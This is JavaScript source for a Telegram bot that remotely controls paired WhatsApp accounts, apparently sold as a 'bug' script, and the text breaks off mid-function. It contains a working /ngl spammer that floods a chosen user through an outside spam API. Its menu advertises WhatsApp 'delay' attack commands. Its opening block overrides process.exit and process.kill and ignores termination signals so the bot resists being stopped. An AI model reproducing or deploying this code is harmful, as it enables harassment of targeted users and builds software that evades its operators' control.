const PLAxios = require("axios");
const PLChalk = require("chalk");
function requestInterceptor(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
      PLChalk.blue("[SECURITY ON MENGAMBIL ALIH SCRIPT GACOR]") +
        PLChalk.gray(" [GITHUB SECURITY ON] ➜  " + urlTarget)
    );
  }
  return cfg;
}
function errorInterceptor(error) {
  const nihUrlKlwError = error?.config?.url || "URL tidak diketahui";
  console.error(
    PLChalk.yellow("[SECURITY ON ] ➜  Failed To Access: " + nihUrlKlwError)
  );
  return Promise.reject(error);
}

PLAxios.interceptors.request.use(requestInterceptor, errorInterceptor);

// Ini Batas Untuk Interceptor Axios nya

const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, argumentsList) {
    console.log("[✅ ] SECURITY ON");
  },
});

const originalKill = process.kill;
process.kill = function (pid, signal) {
  if (pid === process.pid) {
    console.log("[✅ ]  SECURITY ON");
  } else {
    return originalKill(pid, signal);
  }
};

["SIGINT", "SIGTERM", "SIGHUP"].forEach((signal) => {
  process.on(signal, () => {
    console.log("[✅ ] Sinyal " + signal + " terdeteksi dan diabaikan");
  });
});

process.on("uncaughtException", (error) => {
  console.log("[✅ ] uncaughtException: " + error);
});
process.on("unhandledRejection", (reason) => {
  console.log("[✅ ] unhandledRejection: " + reason);
});const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReConnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisConnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const dotenv = require("dotenv");
const FormData = require("form-data");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "./assets/cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const config = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ~ Thumbnail Vid
const vidthumbnail = "https://files.catbox.moe/h8wpjn.mp4";

// ~ Database Url
const databaseURL = "https://raw.githubusercontent.com/rmzz-lightverde/Ramz/main/file.zip";

async function isTokenRegistered(token) {
    try {
        const response = await axios.get(databaseURL);
        const tokenData = response.data;

        if (!tokenData.tokens.includes(token)) {
            console.log(chalk.red("Leviroz Trasher— [ * ]\n❌ Your Bot Token Is Not Registered\n— Please Contact The Owner\n— @inaa_str28( Telegram )"));
            process.exit(1); // Keluar dari script
        } else {
            console.log(chalk.cyan("Glithc Spy— [ ★ ]\n– Version : 3.0.0\n– Developer : Syadd \n– Telegram : @inaa_str28\n\nTelegram Bot Successfully Connected"));
        }
    } catch (error) {
        console.error("❌ Gagal mengambil data token:", error.message);
        process.exit(1);
    }
}


isTokenRegistered(BOT_TOKEN);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));

const USER_IDS_FILE = 'database/userids.json';

function readUserIds() {
    try {
        const data = fs.readFileSync(USER_IDS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}


function saveUserIds(userIds) {
    try {
        fs.writeFileSync(USER_IDS_FILE, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

const userIds = new Set(readUserIds());

function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`Pengguna ${userId} ditambahkan.`);
    }
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>『 ✧ 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 ✧ 』</blockquote>
— Number : ${botNumber}.
— Status : Process
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>『 ✧ 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 ✧ 』</blockquote>
— Number : ${botNumber}.
— Status : Not Connected
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await ConnectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>『 ✧ 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 ✧ 』</blockquote>
— Number : ${botNumber}.
— Status : Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>『 ✧ 𝐂𝐑𝐀𝐒𝐇 𝐔𝐂𝐇𝐈𝐇𝐀 ✧ 』</blockquote>
— Number : ${botNumber}.
— Status : Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  let customcode = "GLITCSPY"
  const code = await sock.requestPairingCode(botNumber, customcode);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>『 ✧ 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 ✧ 』</blockquote>
— Number : ${botNumber}.
— Code Pairing : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>『 ✧ 𝐂𝐑𝐀𝐒𝐇 𝐔𝐂𝐇𝐈𝐇𝐀 ✧ 』</blockquote>
— Number : ${botNumber}.
─ Status : Error ❌ ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// ~ Fungsional Function Before Parameters
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Get Speed Bots
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Premium ! - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}
 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();

  bot.sendVideo(chatId, vidthumbnail, {
caption: `
<blockquote><b>「 ⓘ. 𝙏𝙃𝙀 𝘾𝙊𝙎𝙏 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈」</b></blockquote>
<b> ─ Olaaa ${username}</b><b> ~ Hi, I'm the JANGAN TERLALU MENCINTAI DIA TERLALU DALAM KALAU TIDAK MAU SAKIT SEDALAM LAUTAN ↯。</b>

<blockquote>「 ⓘ. Script ↯ Information 」</blockquote>
<b>ﾒ. - Bot Name : 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈</b>
<b>ﾒ. - Author : @inaa_str28</b>
<b>ﾒ. - Version : 1.0.0 Vvip</b>
<b>ﾒ. - Runtime : ${runtime}</b>

<blockquote><b>「 ⓘ. Status ↯ Information 」</b></blockquote>
<b>ﾒ. - User ID   : ${senderId}</b>
<b>ﾒ. - Username  : ${username}</b>
<b>ﾒ. - Status : ${premiumStatus}</b>

<blockquote> © inaa— 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 </blockquote>
`,

    parse_mode: "HTML",
    reply_markup: {
     inline_keyboard: [
     [
      { text: "Menu ✧ Tools", callback_data: "toolsmenu" },
      { text: "Menu ✧ Acces", callback_data: "accesmenu" }
    ],
    [
      { text: "Glithc ✧ Available", callback_data: "trashmenu" }
    ],
    [ 
      { text: "Thanks ✧ Support", callback_data: "thanksto" }
    ],
    [
      { text: "This Is ✧ Creator", url: "https://t.me/akbarstecuu" }
    ]
  ]
 }
 });
   const audioPath = path.join(__dirname, "./assets/ForLeviroz.mp3");
  await bot.sendAudio(chatId, audioPath, {
    caption: `Syadd Catalyze </>`,
    perfomer: `Syadd Catalyze </>`,
  });
});

bot.on("polling_error", (err) => {
  console.log("❌ POLLING ERROR:", err.code, err.message);
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);

    let caption = "";
    let replyMarkup = {};

    if (query.data === "toolsmenu") {
      caption = `
<blockquote><b>「 ⓘ. 𝙏𝙃𝙀 𝘾𝙊𝙎𝙏 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈  」</b></blockquote>
<b> ─ Olaaa ${username}</b><b> ~ Hi, I'm the JANGAN TERLALU MENCINTAI DIA TERLALU DALAM KALAU TIDAK MAU SAKIT SEDALAM LAUTAN ↯。</b>

<blockquote>「 ⓘ. Status ↯ Information ♰ 」</blockquote>
<b>ﾒ. - User ID   : ${senderId}</b>
<b>ﾒ. - Username  : ${username}</b>
<b>ﾒ. - Status : ${premiumStatus}</b>

<blockquote><b>「 ⓘ. Tools ↯ Mode 🍁 」</b></blockquote>
<b>⚘. - /antilink on|off</b>
<b>⤷ #- Anti Link</b>
<b>⚘. - /tiktokdl</b>
<b>⤷ #- Search Tiktok</b>
<b>⚘. - /negarainfo</b>
<b>⤷ #- Info Sekitar Tentang Negara</b>
<b>⚘. - /gempa</b>
<b>⤷ #- Info Sekitar Tentang Gempa</b>
<b>⚘. - /trackip</b>
<b>⤷ #- Tracking iPhone</b>
<b>⚘. - /ngl</b>
<b>⤷ #- Spammer User Ngl</b>

<blockquote> © inaa — 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "accesmenu") {
      caption = `
<blockquote><b>「 ⓘ. 𝙏𝙃𝙀 𝘾𝙊𝙎𝙏 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 」</b></blockquote>
<b> ─ Olaaa ${username}</b><b> ~ Hi, I'm the JANGAN TERLALU MENCINTAI DIA TERLALU DALAM kalau TIDAK MAU SAKIT SEDALAM LAUTAN ↯。</b>

<blockquote>「 ⓘ. Status ↯ Information ♰ 」</blockquote>
<b>ﾒ. - User ID   : ${senderId}</b>
<b>ﾒ. - Username  : ${username}</b>
<b>ﾒ. - Status : ${premiumStatus}</b>

<blockquote><b>「 ⓘ. Acces ↯ Menu ♰ 」</b></blockquote>
ⵢ. /setcd ( Duration )
ⵢ. /addadmin ( ID )
ⵢ. /addprem ( ID ) 
ⵢ. /deladmin ( ID )
ⵢ. /delprem ( ID )
ⵢ. /connect ( Number )

<blockquote> © inaa — 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 ཀ</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }

    if (query.data === "trashmenu") {
      caption = `
<blockquote><b>「 ⓘ. 𝙏𝙃𝙀 𝘾𝙊𝙎𝙏 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 」</b></blockquote>
<b> ─ Olaaa ${username}</b><b> ~ Hi, I'm the JANGAN TERLALU MENCINTAI DIA TERLALU DALAM KALAU TIDAK MAU SAKIT SEDALAM LAUTAN ↯。</b>

<blockquote>「 ⓘ. Status ↯ Information ♰ 」</blockquote>
<b>ﾒ. - User ID   : ${senderId}</b>
<b>ﾒ. - Username  : ${username}</b>
<b>ﾒ. - Status : ${premiumStatus}</b>

<blockquote><b>「 ⓘ. 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 ↯♰ 」</b></blockquote>
<b>⚘. - /XGostDelay</b>
<b>⤷ #- Delaymedium</b>
<b>⚘. - /XDelay</b>
<b>⤷ #- Delayhard</b>
<b>⚘. - /DelayMaklo</b>
<b>⤷ #- Delay bebas spam</b>

<blockquote> © inaa — 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈🍁 ཀ</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "thanksto") {
      caption = `
<blockquote><b>「 ⓘ.𝙏𝙃𝙀 𝘾𝙊𝙎𝙏 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 」</b></blockquote>
<b> ─ Olaaa ${username}</b><b> ~ Hi, I'm the JANGAN TERLALU MENCINTAI DIA TERLALU DALAM KALAU TIDAK MAU SAKIT SEDALAM LAUTAN ↯。</b>

<blockquote>「 ⓘ. Status ↯ Information ♰ 」</blockquote>
<b>ﾒ. - User ID   : ${senderId}</b>
<b>ﾒ. - Username  : ${username}</b>
<b>ﾒ. - Status : ${premiumStatus}</b>

<blockquote><b>「 ⓘ. 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 𐙚
𝐂𝐑𝐄𝐃𝐈𝐓𝐒 🍁 」</b></blockquote>
<b>⚘. - @inaa_str28</b>
<b>⤷ #- Developer</b>

<blockquote><b>「 ⓘ. 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 𐙚 𝐓𝐐𝐓𝐎
 🍁 」</b></blockquote>
<b>⤷ #- @inaa_str28</b>
<b>⚘. - All Buyer Script</b>
<b>⤷ #- My Best Support</b>

<blockquote> © inaa — 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `
<blockquote><b>「 ⓘ. 𝙏𝙃𝙀 𝘾𝙊𝙎𝙏 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 」</b></blockquote>
<b> ─ Olaaa ${username}</b><b> ~ Hi, I'm the JANGAN TERLALU MENCINTAI DIA TERLALU DALAM KALAU TIDAK MAU SAKIT SEDALAM LAUTAN ↯。</b>

<blockquote>「 ⓘ. Script ↯ Information ♰ 」</blockquote>
<b>ﾒ. - Bot Name : 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈</b>
<b>ﾒ. - Author : @inaa_str28</b>
<b>ﾒ. - Version : 1.0.0 Vvip</b>
<b>ﾒ. - Runtime : ${runtime}</b>

<blockquote>「 ⓘ. Status ↯ Information ♰ 」</blockquote>
<b>ﾒ. - User ID   : ${senderId}</b>
<b>ﾒ. - Username  : ${username}</b>
<b>ﾒ. - Status : ${premiumStatus}</b>

<blockquote> © inaa — 𝙊𝙁 𝙁𝙍𝙀𝙀𝘿𝙊𝙈 ཀ</blockquote>
`;
      replyMarkup = {
     inline_keyboard: [
     [
      { text: "Menu ✧ Tools", callback_data: "toolsmenu" },
      { text: "Menu ✧ Acces", callback_data: "accesmenu" }
    ],
    [
      { text: "Glithc ✧ Available", callback_data: "trashmenu" }
    ],
    [ 
      { text: "Thanks ✧ Support", callback_data: "thanksto" }
    ],
    [
      { text: "This Is ✧ Creator", url: "https://t.me/inaa_str28" }
    ]
  ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: vidthumbnail,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

bot.onText(/^\/ngl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const raw = (match && match[1] ? match[1] : "").trim();

  if (!raw) {
    return bot.sendMessage(chatId, "Username,Pesan\nExample: /ngl username,pesan");
  }

  const firstComma = raw.indexOf(",");
  if (firstComma === -1) {
    return bot.sendMessage(chatId, "Usage: /ngl username,pesan\nPastikan ada koma untuk memisahkan username dan pesan.");
  }

  const rawUsername = raw.slice(0, firstComma).trim();
  const message = raw.slice(firstComma + 1).trim();

  if (!rawUsername || !message) {
    return bot.sendMessage(chatId, "Username atau pesan kosong. Format: /ngl username,pesan");
  }

  const cleanUsername = rawUsername.replace(/^@+/, "");
  if (!/^[\\w.-]{2,64}$/.test(cleanUsername)) {
    return bot.sendMessage(chatId, "Username tidak valid. Hanya huruf, angka, underscore, dot atau dash, minimal 2 karakter.");
  }

  const displayUsername = "@" + cleanUsername;

  const TOTAL = 20, PER_BATCH = 5, DELAY_MS = 2000, API_BASE = "https://joozxdev.my.id/api/spam";

  await bot.sendMessage(chatId, `Memulai pengiriman ${TOTAL} pesan ke ${displayUsername}...`);

  let success = 0;

  for (let offset = 0, batchNum = 1; offset < TOTAL; offset += PER_BATCH, batchNum++) {
    const remaining = TOTAL - offset;
    const batchCount = Math.min(PER_BATCH, remaining);

    const url = `${API_BASE}?u=${encodeURIComponent(cleanUsername)}&m=${encodeURIComponent(message)}&c=${encodeURIComponent(batchCount)}`;

    const result = await safeFetch(url, { timeout: 10000 }, 2);

    if (result.ok && result.data && (result.data.success === true || result.data.success === "true")) {
      success += batchCount;
      await bot.sendMessage(chatId, `Batch ${batchNum}: sukses (${success}/${TOTAL})`);
    } else {
      const reason =
        result.error ||
        (result.data && JSON.stringify(result.data)) ||
        result.text ||
        `HTTP ${result.status || "?"}`;
      await bot.sendMessage(chatId, `Batch ${batchNum} gagal: ${String(reason).slice(0, 300)}`);
    }

    await sleep(DELAY_MS);
  }

  return bot.sendMessage(chatId, `Selesai! Total sukses: ${success}/${TOTAL} ke ${displayUsername}`);
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim();

  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/^\/tiktokdl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  await bot.sendMessage(chatId, "📥 Tunggu bentar bre, lagi download video TikTok-nya...");

  try {
    const api = `https://api.nekolabs.web.id/downloader/tiktok?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data dari API NekoLabs bre.");
    }

    const result = data.result;

    const caption =
      `🎬 *TikTok Downloader*\n\n` +
      `👤 *${result.author.name}* (${result.author.username})\n` +
      `🎶 *${result.music_info.title}* - ${result.music_info.author}\n` +
      `❤️ ${result.stats.like}  💬 ${result.stats.comment}  🔁 ${result.stats.share}\n` +
      `🕒 ${result.create_at}`;

    // Kirim video
    await bot.sendVideo(chatId, result.videoUrl, {
      caption,
      parse_mode: "Markdown",
    });

    // Kirim sound/music
    await bot.sendAudio(chatId, result.musicUrl, {
      filename: `${result.music_info.title}.mp3`,
      caption: `🎵 ${result.music_info.title} - ${result.music_info.author}`,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("TIKTOK ERROR:", err.message);
    bot.sendMessage(chatId, "❌ Gagal ambil data TikTok bre, coba lagi nanti.");
  }
});

bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = (match[1] || "").trim();

  if (!ip) return bot.sendMessage(chatId, "⚠️ Contoh:\n/trackip 8.8.8.8");

  bot.sendMessage(chatId, "🛰 Sedang melacak IP...");

  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    if (data.status !== "success") throw new Error("IP tidak ditemukan");

    const teks = `
🌍 *IP FOUND!*

• *IP:* ${data.query}
• *Country:* ${data.country}
• *City:* ${data.city}
• *ISP:* ${data.isp}

📍 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;
    await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error: " + err.message);
  }
});

let antiLink = true; // default aktif
const linkPattern = /(https?:\/\/|t\.me|www\.)/i;

// Command /antilink on/off
bot.onText(/^\/antilink (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const status = match[1].toLowerCase();

  if (status === "on") {
    antiLink = true;
    bot.sendMessage(chatId, "✅ AntiLink diaktifkan!");
  } else {
    antiLink = false;
    bot.sendMessage(chatId, "⚙️ AntiLink dimatikan!");
  }
});

// Hapus pesan jika ada link
bot.on("message", (msg) => {
  if (!antiLink) return;
  if (!msg.text) return;

  const chatId = msg.chat.id;
  if (linkPattern.test(msg.text)) {
